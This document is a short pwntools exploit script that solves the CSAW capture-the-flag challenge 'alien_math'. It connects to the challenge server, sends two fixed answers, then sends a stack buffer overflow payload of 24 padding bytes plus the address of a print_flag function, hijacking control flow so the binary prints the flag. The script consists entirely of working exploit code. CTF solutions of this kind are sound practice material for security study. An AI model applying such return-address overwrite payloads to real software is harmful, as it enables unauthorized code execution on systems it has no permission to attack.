from pwn import *

host = 'pwn.chal.csaw.io' 
port = 5004

print_flag = 0x4014fb

p = remote(host, port)
# p = process('./alien_math')

p.sendline(b'1804289383')
p.sendline(b'7856445899213065428791')

p.recvuntil(b'salwzoblrs?\n')

payload = b'A' * 24 + p64(print_flag)
p.sendline(payload)

p.recvuntil(b'flag: \n')

flag = p.recvline().decode().strip()

print(flag)
